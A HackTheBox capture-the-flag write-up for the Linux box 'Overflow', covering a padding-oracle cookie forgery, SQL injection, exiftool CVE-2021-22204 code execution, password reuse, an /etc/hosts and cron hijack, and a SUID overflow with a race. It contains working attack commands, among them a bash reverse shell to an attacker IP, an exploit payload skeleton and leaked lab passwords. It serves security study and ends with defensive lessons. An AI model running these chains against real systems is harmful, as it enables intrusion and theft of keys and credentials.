---
title: "Overflow"
date: 2022-04-09
type: docs
tags:
  - htb
  - linux
  - hard
  - padding-oracle
  - padbuster
  - cbc
  - sqli
  - sqlmap
  - cms-made-simple
  - exiftool
  - cve-2021-22204
  - rce
  - password-reuse
  - hosts-file
  - cron
  - suid
  - buffer-overflow
  - ret2libc
  - toctou
  - race-condition
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Hard, **Released:** 2022-04-09, **IP:** `10.10.11.119` , `overflow.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes are recon plus spotting that the `auth` cookie is a padded ciphertext. Everything after is reconstructed from published writeups (0xdf, fdlucifer, 4g3nt47) and marked. This is a long six stage chain.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. The `auth` cookie is **AES-CBC** with a padding oracle ("Invalid padding" on tamper). `padbuster` decrypts it (`user=<name>`) and re-encrypts `user=admin`. Now admin.
2. Admin unlocks `home/logs.php?name=`, which is **SQL injectable**. sqlmap dumps `cmsmsdb.cms_users`. CMS Made Simple salts with a `sitemask` from `cms_siteprefs`, so `hashcat -m 20` cracks the `editor` password `alpha!@#$%bravo`.
3. CMS Made Simple 2.2.14. A second vhost, `devbuild-job.overflow.htb`, has a resume upload that runs **exiftool 11.92**, vulnerable to **CVE-2021-22204** (DjVu metadata command injection). RCE as **`www-data`**.
4. `/var/www/html/config/db.php` (and two other apps) leak `developer : sh@tim@n`. `su developer`.
5. `developer` is in the `network` group and can edit `/etc/hosts`. A minutely root-ish job runs `bash < <(curl -s http://taskmanage.overflow.htb/task.sh)`. Point that host at your box, serve a reverse shell, get **`tester`**.
6. `/opt/file_encrypt/file_encrypt` is **SUID root**: a predictable PIN, a `scanf("%s")` **stack overflow** (ret2libc / return to `encrypt()`), and a **TOCTOU** on the input file. Race a symlink to `/root/.ssh/id_rsa`, decrypt the output, `ssh root@overflow.htb`.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| CMS `editor` (cracked, `-m 20`) | `alpha!@#$%bravo` |
| `db.php` , `developer` | `sh@tim@n` |
| `user.txt` | `/home/tester/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Overflow is a tour of six different vulnerability classes, one per stage: a **CBC padding oracle**, a **SQL injection**, a **command injection through exiftool**, **password reuse**, a **`/etc/hosts` plus cron** trick, and finally a **SUID binary** that combines a predictable PRNG, a classic **stack buffer overflow**, and a **TOCTOU race**. It is a hard box that rewards patience and good notes more than any single deep skill. The most transferable piece is the padding oracle: any time a site returns a distinguishable error for "bad padding" vs "bad data" on an encrypted token, `padbuster` turns that into full decrypt and encrypt of arbitrary plaintext with no key.

Related crypto oracle boxes: rare, this is the reference. Related exiftool CVE-2021-22204: [Interface](/writeups/hackthebox/linux/medium/interface/) is a different exiftool bug (arithmetic injection), same "metadata is code" lesson. Related `/etc/hosts` plus cron: [Inject](/writeups/hackthebox/linux/easy/inject/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/). Related SUID buffer overflow: [Ouija](/writeups/hackthebox/linux/insane/ouija/), and pwn practice rooms in `Notes/`.

---

## Full Walkthrough

### Recon

```console
Open 10.10.11.119:22
Open 10.10.11.119:25       # Postfix
Open 10.10.11.119:80       # Apache, custom PHP app
```

Registering issues an `auth` cookie:

```
Cookie: auth=1yVVTfrGLUIhwahmfc8ZQrmXFCSBiFUD
```

URL-decoded and base64-decoded, it is a multiple of 8 bytes, and tampering with it returns an "Invalid padding" style error while a well-formed-but-wrong value returns something else. That is a **padding oracle**.

### Stage 1, CBC padding oracle to admin

<div class="callout callout-note">

**What a padding oracle gives you**

CBC decryption fails in two distinguishable ways: the PKCS#7 padding is wrong (server says "invalid padding") or the padding is fine but the plaintext is garbage (server says something else). `padbuster` uses that one bit per request to recover the intermediate state of each block, which lets it **decrypt** the cookie and, with `-plaintext`, **encrypt** any value you want, all without the key. The cookie here is `user=<username>`; change it to `user=admin`.

</div>

```bash
# decrypt
padbuster http://10.10.11.119/ '<url-decoded auth cookie>' 8 \
  -cookie 'auth=<url-decoded auth cookie>'
# choose the response id that corresponds to the error, output: user=0xdf

# forge
padbuster http://10.10.11.119/ '<cookie>' 8 -cookie 'auth=<cookie>' -plaintext 'user=admin'
# -> BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
```

Set that as `auth` and the admin menu appears.

### Stage 2, SQLi in the logs panel

Admin adds a "Logs" link: `http://overflow.htb/home/logs.php?name=admin`.

```bash
curl "http://overflow.htb/home/logs.php?name=admin')"     # 500 -> injectable
sqlmap -r logs.req -p name --batch --dbs
# databases: logs, cmsmsdb, Overflow
sqlmap -r logs.req -p name --batch -D cmsmsdb -T cms_users --dump
sqlmap -r logs.req -p name --batch -D cmsmsdb -T cms_siteprefs --dump   # sitemask
```

<div class="callout callout-note">

**Cracking CMS Made Simple hashes**

CMS Made Simple stores `md5(sitemask . password)`, where `sitemask` is a per-install string in `cms_siteprefs`. That is hashcat mode **20** (`md5($salt.$pass)`), fed as `<hash>:<sitemask>`. The `editor` account cracks to `alpha!@#$%bravo`. The `admin` hash does not crack, `editor` is enough.

</div>

### Stage 3, exiftool RCE (CVE-2021-22204)

`editor` logs into CMS Made Simple 2.2.14. "User Defined Tags" and config hint at another vhost: **`devbuild-job.overflow.htb`**, a job application site. Log in there with the `editor` creds and use the **resume upload** (accepts TIFF/JPEG).

<div class="callout callout-note">

**CVE-2021-22204**

exiftool <= 12.23 mishandles **DjVu** annotations: a `(metadata "\c${...}")` block is passed to Perl `eval`. If the target processes an uploaded image with a vulnerable exiftool (here 11.92), you get code execution as the web user. Build the payload with `bzz` + `djvumake`, then embed it in a JPEG via a chained tag (`-HasselbladExif<=exploit.djvu`). Public PoC: convisoappsec/CVE-2021-22204-exiftool.

</div>

```python
payload  = b"(metadata \"\\c${use MIME::Base64;eval(decode_base64('"
payload += base64.b64encode(b"use Socket;...exec('/bin/sh -i');")
payload += b"'))};\")"
# bzz payload payload.bzz ; djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTz=payload.bzz
# exiftool -HasselbladExif<=exploit.djvu image.jpg   -> upload image.jpg
```

Shell as **`www-data`**.

### Stage 4, www-data to developer

```php
// /var/www/html/config/db.php   (same creds in two other app configs)
$user = 'developer';
$pass = 'sh@tim@n';
```

```bash
su developer        # sh@tim@n
```

### Stage 5, developer to tester

`developer` is in the `network` group, which owns `/etc/hosts`. `pspy` shows `/opt/commontask.sh` running every minute:

```bash
bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
```

<div class="callout callout-note">

**Rewrite the DNS, serve the script**

The cron fetches `task.sh` from `taskmanage.overflow.htb` and pipes it to bash. `developer` can edit `/etc/hosts`, so point that name at your box and host a reverse shell as `task.sh`.

</div>

```bash
echo "10.10.14.6 taskmanage.overflow.htb" >> /etc/hosts
echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' > task.sh
python3 -m http.server 80
# wait ~1 min -> shell as tester
```

`user.txt` is in `/home/tester`.

### Stage 6, SUID file_encrypt to root

`/opt/file_encrypt/file_encrypt` is **SUID root**, 32-bit. Three bugs stacked:

<div class="callout callout-note">

**The PIN, the overflow, the race**

1. **Predictable PIN.** `check_pin()` seeds nothing, so `rand()` returns the well-known first value `1804289383`, and the custom mixer is deterministic. Compute the expected PIN offline:
```python
x = 0x6b8b4567
for _ in range(10): x = ((x * 0x59) + 0x14) % 2**32
pin = x ^ 1804289383      # feed this (signed) value
```
2. **Stack overflow.** After the PIN, `scanf("%s", name)` reads into a 20-byte buffer. Offset to saved EIP is 44. PIE is off on the server, so return to `encrypt()` (`p encrypt` in gdb) with an all-ASCII address to re-run the encrypt routine on your chosen file.
```bash
python3 -c 'print("<pin>\n" + "A"*44 + "\x5b\x58\x55\x56")'   | ./file_encrypt
```
3. **TOCTOU.** The binary `stat`s the input path, rejects it if `st_uid == 0`, then `sleep(3)`, then `fopen`s it. Race a symlink so the `stat` sees a file you own and the `fopen` sees `/root/.ssh/id_rsa`:
```bash
# shell A
while :; do ln -sf /home/tester/mine l; sleep 3; ln -sf /root/.ssh/id_rsa l; sleep 3; done
# shell B
python3 sploit.py /tmp/l /tmp/out | ./file_encrypt
```
The output is XOR-encrypted with a fixed key (`0x9b`); decrypt it:
```python
print(bytes(b ^ 0x9b for b in open('/tmp/out','rb').read()).decode())
```

</div>

Recover `/root/.ssh/id_rsa`, then:

```bash
ssh -i root_id_rsa root@overflow.htb
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/tester/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Encrypted tokens need a MAC (encrypt-then-MAC).** Unauthenticated CBC plus a distinguishable padding error is total token forgery. Use `AES-GCM` or a signed cookie.
- **Parameterise queries**, even in an "admin only" panel.
- **Patch exiftool** and never run it on untrusted uploads without a sandbox. Metadata is attacker code.
- **`/etc/hosts` write plus a cron that curls a hostname is RCE.** Restrict who can edit `hosts`, and pin the cron to an IP with integrity checks.
- **SUID C with `scanf("%s")`, unseeded `rand()`, and check-then-use file handling** is three findings in one binary. Compile with stack protector, PIE, FORTIFY, and use `openat`/`fstat` on the same fd.

---

## Related Writeups

- **exiftool metadata injection:** [Interface](/writeups/hackthebox/linux/medium/interface/)
- **`/etc/hosts` plus cron / task fetch:** [Inject](/writeups/hackthebox/linux/easy/inject/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/)
- **SUID / buffer overflow to root:** [Ouija](/writeups/hackthebox/linux/insane/ouija/), and the pwn notes in `Notes/`
- **Password reuse from a config file:** [Bolt](/writeups/hackthebox/linux/medium/bolt/), [Magic](/writeups/hackthebox/linux/medium/magic/), [Previse](/writeups/hackthebox/linux/easy/previse/)

## References

- HTB Overflow (0xdf) <https://0xdf.gitlab.io/2022/04/09/htb-overflow.html>
- HTB Overflow (fdlucifer) <https://fdlucifer.github.io/2022/03/11/overflow/>
- padbuster <https://github.com/AonCyberLabs/PadBuster>
- CVE-2021-22204 PoC <https://github.com/convisoappsec/CVE-2021-22204-exiftool>
